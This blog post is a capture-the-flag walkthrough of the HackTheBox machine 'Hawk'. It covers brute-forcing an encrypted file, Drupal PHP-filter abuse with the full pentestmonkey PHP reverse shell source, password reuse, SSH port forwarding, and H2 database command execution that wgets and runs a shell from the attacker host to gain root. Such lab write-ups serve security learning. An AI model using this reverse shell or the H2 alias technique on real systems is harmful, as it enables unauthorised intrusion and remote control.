@@ -1,0 +1,400 @@
+---
+layout: post
+title:  "HackTheBox - Hawk"
+date:   2021-08-10 01:58:25
+categories: Pentesting
+---
+
+# ENUMERATION
+
+```
+PORT     STATE SERVICE       REASON  VERSION
+21/tcp   open  ftp           syn-ack vsftpd 3.0.3
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_drwxr-xr-x    2 ftp      ftp          4096 Jun 16  2018 messages
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:10.10.14.34
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 1
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+22/tcp   open  ssh           syn-ack OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 e4:0c:cb:c5:a5:91:78:ea:54:96:af:4d:03:e4:fc:88 (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDBj1TNZ7AO3WSpSMz0UoHlGmWQRlvXcyMXMRhDJ8X+9kZZGKkdXxWcDAu/OvUXdwCKVY+YjPPY8wi+jqKIQXlgICA3MEcg3RlLoHPTUh6KFmPxlT7Heaca7xSJ+BnhFxYF+bhhiaHgcaK8qlZFc9qS2Un3oNS6VDAAHOx2p4FU8OVM/yuik9qt6nxAQVS/v3mZfpVUm3HKOOcfXzyZEZAwrAWHk+2Y2yCBUUY1AmCMed566BfmeEOYXJU18I92fsSOhuzTt7tqX4u66SO1cyLTJczSA7gF42K8O+VPyn3pWnLmMBnAcZS0KbMUKVPa3UBSScxl5nLlSFRyJ1rCBxs7
+|   256 95:cb:f8:c7:35:5e:af:a9:44:8b:17:59:4d:db:5a:df (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBM0hCdwqpZ6zvQpLiZ5/tsUDQeVMEXicRx6H8AOW8lyzsHJrrQWgqM1vo5jKUn+bMazqzZ1SbP8QJ3JDS2/SlHs=
+|   256 4a:0b:2e:f7:1d:99:bc:c7:d3:0b:91:53:b9:3b:e2:79 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIF3kNN27mM1080x8c4aOWptSRg6yN21uBMSQiKk1PrsP
+80/tcp   open  http          syn-ack Apache httpd 2.4.29 ((Ubuntu))
+|_http-favicon: Unknown favicon MD5: CF2445DCB53A031C02F9B57E2199BC03
+|_http-generator: Drupal 7 (http://drupal.org)
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+| http-robots.txt: 36 disallowed entries 
+| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
+| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
+| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
+| /LICENSE.txt /MAINTAINERS.txt /update.php /UPGRADE.txt /xmlrpc.php 
+| /admin/ /comment/reply/ /filter/tips/ /node/add/ /search/ 
+| /user/register/ /user/password/ /user/login/ /user/logout/ /?q=admin/ 
+| /?q=comment/reply/ /?q=filter/tips/ /?q=node/add/ /?q=search/ 
+|_/?q=user/password/ /?q=user/register/ /?q=user/login/ /?q=user/logout/
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Welcome to 192.168.56.103 | 192.168.56.103
+5435/tcp open  tcpwrapped    syn-ack
+8082/tcp open  http          syn-ack H2 database http console
+|_http-favicon: Unknown favicon MD5: 8EAA69F8468C7E0D3DFEF67D5944FF4D
+| http-methods: 
+|_  Supported Methods: GET POST
+|_http-title: H2 Console
+9092/tcp open  XmlIpcRegSvc? syn-ack
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+```
+We login via ftp to get one .drupal.txt.enc, Running file command shows that it is "openssl enc'd data with salted password, base64 encoded".So first we base64 decode it then we bruteforce the passwod using a [github tool](https://github.com/thosearetheguise/decrypt-openssl-bruteforce)
+
+```s
+┌──(kali㉿MaskdMafia)-[~/Downloads/decrypt-openssl-bruteforce]
+└─$ python decrypt-openssl-bruteforce.py -i ../drupal.txt.enc -w /usr/share/wordlists/rockyou.txt -s -v -o decrypted.txt
+Optional argument values:
+Salted:True 
+base64:False 
+cipher:-aes256
+Trying password: 123456
+Trying password: 12345
+Trying password: 123456789
+Trying password: password
+Trying password: iloveyou
+Trying password: princess
+Trying password: 1234567
+Trying password: rockyou
+Trying password: 12345678
+Trying password: abc123
+Trying password: nicole
+Trying password: daniel
+Trying password: babygirl
+Trying password: monkey
+Trying password: lovely
+Trying password: jessica
+Trying password: 654321
+Trying password: michael
+Trying password: ashley
+Trying password: qwerty
+Trying password: 111111
+Trying password: iloveu
+Trying password: 000000
+Trying password: michelle
+Trying password: tigger
+Trying password: sunshine
+Trying password: chocolate
+Trying password: password1
+Trying password: soccer
+Trying password: anthony
+Trying password: friends
+
+Key Found! The key is:friends
+Output File Name : decrypted.txt
+
+┌──(kali㉿MaskdMafia)-[~/Downloads/decrypt-openssl-bruteforce]
+└─$ cat decrypted.txt                                                             1 ⨯
+Daniel,
+
+Following the password for the portal:
+
+PencilKeyboardScanner123
+
+Please let us know when the portal is ready.
+
+Kind Regards,
+
+IT department
+```
+
+# FOOTHOLD
+
+With this password and with username admin we log in to port 80.Enumerating more we come across the modules tab and there is a filter which allows us to execute php code blocks on the site ( this filter is unchecked, make sure to check it and save the configurations )
+
+After this we click on "add new content" and copy paste our php reverse shell there, and change the text type at the bottom of the page from HTML to PHP.When we save it while simultaneously listening in out terminal we get a reverse shell.
+
+```php
+<?php
+// php-reverse-shell - A Reverse Shell implementation in PHP
+// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
+//
+// This tool may be used for legal purposes only.  Users take full responsibility
+// for any actions performed using this tool.  The author accepts no liability
+// for damage caused by this tool.  If these terms are not acceptable to you, then
+// do not use this tool.
+//
+// In all other respects the GPL version 2 applies:
+//
+// This program is free software; you can redistribute it and/or modify
+// it under the terms of the GNU General Public License version 2 as
+// published by the Free Software Foundation.
+//
+// This program is distributed in the hope that it will be useful,
+// but WITHOUT ANY WARRANTY; without even the implied warranty of
+// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+// GNU General Public License for more details.
+//
+// You should have received a copy of the GNU General Public License along
+// with this program; if not, write to the Free Software Foundation, Inc.,
+// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
+//
+// This tool may be used for legal purposes only.  Users take full responsibility
+// for any actions performed using this tool.  If these terms are not acceptable to
+// you, then do not use this tool.
+//
+// You are encouraged to send comments, improvements or suggestions to
+// me at pentestmonkey@pentestmonkey.net
+//
+// Description
+// -----------
+// This script will make an outbound TCP connection to a hardcoded IP and port.
+// The recipient will be given a shell running as the current user (apache normally).
+//
+// Limitations
+// -----------
+// proc_open and stream_set_blocking require PHP version 4.3+, or 5+
+// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.
+// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.
+//
+// Usage
+// -----
+// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.
+
+set_time_limit (0);
+$VERSION = "1.0";
+$ip = '10.10.14.34';  // CHANGE THIS
+$port = 1337;       // CHANGE THIS
+$chunk_size = 1400;
+$write_a = null;
+$error_a = null;
+$shell = 'uname -a; w; id; /bin/sh -i';
+$daemon = 0;
+$debug = 0;
+
+//
+// Daemonise ourself if possible to avoid zombies later
+//
+
+// pcntl_fork is hardly ever available, but will allow us to daemonise
+// our php process and avoid zombies.  Worth a try...
+if (function_exists('pcntl_fork')) {
+	// Fork and have the parent process exit
+	$pid = pcntl_fork();
+	
+	if ($pid == -1) {
+		printit("ERROR: Can't fork");
+		exit(1);
+	}
+	
+	if ($pid) {
+		exit(0);  // Parent exits
+	}
+
+	// Make the current process a session leader
+	// Will only succeed if we forked
+	if (posix_setsid() == -1) {
+		printit("Error: Can't setsid()");
+		exit(1);
+	}
+
+	$daemon = 1;
+} else {
+	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
+}
+
+// Change to a safe directory
+chdir("/");
+
+// Remove any umask we inherited
+umask(0);
+
+//
+// Do the reverse shell...
+//
+
+// Open reverse connection
+$sock = fsockopen($ip, $port, $errno, $errstr, 30);
+if (!$sock) {
+	printit("$errstr ($errno)");
+	exit(1);
+}
+
+// Spawn shell process
+$descriptorspec = array(
+   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
+   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
+   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
+);
+
+$process = proc_open($shell, $descriptorspec, $pipes);
+
+if (!is_resource($process)) {
+	printit("ERROR: Can't spawn shell");
+	exit(1);
+}
+
+// Set everything to non-blocking
+// Reason: Occsionally reads will block, even though stream_select tells us they won't
+stream_set_blocking($pipes[0], 0);
+stream_set_blocking($pipes[1], 0);
+stream_set_blocking($pipes[2], 0);
+stream_set_blocking($sock, 0);
+
+printit("Successfully opened reverse shell to $ip:$port");
+
+while (1) {
+	// Check for end of TCP connection
+	if (feof($sock)) {
+		printit("ERROR: Shell connection terminated");
+		break;
+	}
+
+	// Check for end of STDOUT
+	if (feof($pipes[1])) {
+		printit("ERROR: Shell process terminated");
+		break;
+	}
+
+	// Wait until a command is end down $sock, or some
+	// command output is available on STDOUT or STDERR
+	$read_a = array($sock, $pipes[1], $pipes[2]);
+	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
+
+	// If we can read from the TCP socket, send
+	// data to process's STDIN
+	if (in_array($sock, $read_a)) {
+		if ($debug) printit("SOCK READ");
+		$input = fread($sock, $chunk_size);
+		if ($debug) printit("SOCK: $input");
+		fwrite($pipes[0], $input);
+	}
+
+	// If we can read from the process's STDOUT
+	// send data down tcp connection
+	if (in_array($pipes[1], $read_a)) {
+		if ($debug) printit("STDOUT READ");
+		$input = fread($pipes[1], $chunk_size);
+		if ($debug) printit("STDOUT: $input");
+		fwrite($sock, $input);
+	}
+
+	// If we can read from the process's STDERR
+	// send data down tcp connection
+	if (in_array($pipes[2], $read_a)) {
+		if ($debug) printit("STDERR READ");
+		$input = fread($pipes[2], $chunk_size);
+		if ($debug) printit("STDERR: $input");
+		fwrite($sock, $input);
+	}
+}
+
+fclose($sock);
+fclose($pipes[0]);
+fclose($pipes[1]);
+fclose($pipes[2]);
+proc_close($process);
+
+// Like print, but does nothing if we've daemonised ourself
+// (I can't figure out how to redirect STDOUT like a proper daemon)
+function printit ($string) {
+	if (!$daemon) {
+		print "$string\n";
+	}
+}
+
+?> 
+
+```
+On getting shell we stabilise it using socat.
+```s
+┌──(kali㉿MaskdMafia)-[~/Downloads]
+└─$ nc -lnvp 1337
+listening on [any] 1337 ...
+connect to [10.10.14.34] from (UNKNOWN) [10.10.10.102] 41530
+Linux hawk 4.15.0-23-generic #25-Ubuntu SMP Wed May 23 18:02:16 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
+ 10:17:37 up 40 min,  0 users,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ which python
+$ which python3
+/usr/bin/python3
+$ python3 -c "import pty;pty.spawn('/bin/bash')"
+www-data@hawk:/$ cd /tmp
+```
+User flag is in /home/daniel/user.txt
+
+# PRIVILEGE ESCALATION
+
+In settings.php in /var/www/html we find the password for mysql:
+```s
+ *     'driver' => 'sqlite',
+ *     'database' => '/path/to/databasefilename',
+      'database' => 'drupal',
+      'username' => 'drupal',
+      'password' => 'drupal4hawk',
+```
+This password turns out to be user daniel's ssh password.However when we enter it we see we have entered python terminal so we call a proper shell using this command:
+
+```py
+Last login: Tue Aug 10 10:33:58 2021 from 10.10.14.34
+Python 3.6.5 (default, Apr  1 2018, 05:46:30) 
+[GCC 7.3.0] on linux
+Type "help", "copyright", "credits" or "license" for more information.
+>>> import os
+>>> os.system('/bin/bash')
+```
+On to root:
+
+To find out if there are cronjobs running(sudo -l said that user daniel is not allowed to run sudo on the machine) we upload pspy64s and run it.We find that a jar file is being executed:
+```s
+2021/08/10 10:36:20 CMD: UID=0    PID=763    | /usr/lib/accountsservice/accounts-daemon 
+2021/08/10 10:36:20 CMD: UID=0    PID=758    | /usr/bin/java -jar /opt/h2/bin/h2-1.4.196.jar 
+2021/08/10 10:36:20 CMD: UID=0    PID=757    | /bin/sh -c /usr/bin/java -jar /opt/h2/bin/h2-1.4.196.jar 
+2021/08/10 10:36:20 CMD: UID=0    PID=755    | /usr/sbin/CRON -f 
+```
+This reminds us of the H2 database in port 8082 which we didn't have permission to access.Maybe we can only access it locally on the machine so we port forward it and access it.
+```s
+┌──(kali㉿MaskdMafia)-[~/Downloads]
+└─$ ssh -L 8082:127.0.0.1:8082 daniel@10.10.10.102
+daniel@10.10.10.102's password: 
+Welcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-23-generic x86_64)
+```
+After this we google a little bit and find this example from [hacktricks](https://book.hacktricks.xyz/pentesting/pentesting-web/h2-java-sql-database) where we can connect via a user unauthenticated, so I give /root and connect .
+
+After this I found this [great page](https://mthbernardes.github.io/rce/2018/03/14/abusing-h2-database-alias.html) which shows how to execute commands on h2 database so I ran these commands:
+
+```java
+CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A"); return s.hasNext() ? s.next() : "";  }$$;
+CALL SHELLEXEC('wget http://10.10.14.34/shell.php')
+
+CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A"); return s.hasNext() ? s.next() : "";  }$$;
+CALL SHELLEXEC('php shell.php')
+```
+Make sure to keep a python server running so that we can upload it via wget. And we see that the terminal we were listening has got a reverse shell:
+
+```s
+┌──(kali㉿MaskdMafia)-[~/Downloads]
+└─$ nc -lnvp 1234
+listening on [any] 1234 ...
+connect to [10.10.14.34] from (UNKNOWN) [10.10.10.102] 34754
+Linux hawk 4.15.0-23-generic #25-Ubuntu SMP Wed May 23 18:02:16 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
+ 11:11:50 up  1:35,  2 users,  load average: 0.00, 0.01, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+daniel   pts/2    10.10.14.34      10:33   33:36   0.30s  0.02s /bin/bash
+daniel   pts/3    10.10.14.34      10:40   30:38   0.06s  0.00s /bin/bash
+uid=0(root) gid=0(root) groups=0(root)
+/bin/sh: 0: can't access tty; job control turned off
+# cat root.txt
+```
+Root flag is in /root/root.txt
